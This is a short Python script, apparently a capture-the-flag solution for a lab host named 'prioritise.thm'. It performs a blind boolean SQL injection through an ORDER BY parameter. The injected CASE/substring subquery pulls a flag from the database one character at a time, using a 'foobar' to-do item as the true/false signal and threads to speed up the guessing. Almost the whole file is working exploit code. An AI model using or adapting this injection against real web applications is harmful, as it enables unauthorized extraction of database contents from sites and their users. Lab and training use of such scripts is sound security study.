#!/usr/bin/env python3
import requests
import concurrent.futures

# for this script, the todo list four items
# give the first three random names, other than foobar
# name the fourth item foobar


# guess the flag
query = 'http://prioritise.thm/?order=title limit (select case when (substring((select flag from flag),1,{})="{}") then 4 else 1 end);--'


tmp = []
cur = None
i = [1]

nums = [chr(i) for i in range(ord('0'),ord('9')+1)]
lower = [chr(i) for i in range(ord('a'),ord('z')+1)]
upper = [chr(i) for i in range(ord('A'),ord('Z')+1)]
special = ['-','_','+','{','}','[',']','(',')','!','~','|','.',',']
chars = nums + lower + upper + special

def req(tmp,c, i):
    res = requests.get(
        query.format(i[0], ''.join(tmp)+c)
    )
    if 'foobar' in res.text: # find your own condition to insert here eg if the number of items returned is three
        tmp.append(c)
        i[0] += 1
        # print(''.join(tmp))

# repeat till fragment matches actual flag
while cur != tmp:
    cur = tmp.copy()
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        for c in chars:
            pool.submit(req,tmp,c,i)

print(''.join(cur))
